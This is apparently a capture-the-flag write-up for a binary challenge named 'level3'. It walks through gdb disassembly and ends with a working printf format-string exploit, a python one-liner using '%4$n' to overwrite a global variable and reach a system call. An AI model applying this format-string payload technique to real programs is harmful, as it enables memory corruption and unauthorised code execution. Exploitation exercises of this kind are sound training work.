The <main> function makes a call to <v> function.

$ (gdb) disas main
...
0x08048520 <+6>:	call   0x80484a4 <v>
...

To get to the <system> call we need to pass the following check that compares
the variable <m> to 0x40 (64)

$ (gdb) disas v
...
0x080484da <+54>:	mov    eax, ds:0x804988c
0x080484df <+59>:	cmp    eax, 0x40
...

To do so, we exploit the printf %n format which allows us to write a value at any address we want.
Playing around with printf we see that we control the 4th argument on the stack.
So in the end we have to write 64 bytes at 0x0804988c.

$ cat <(python -c "print('\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n')") - | ./level3
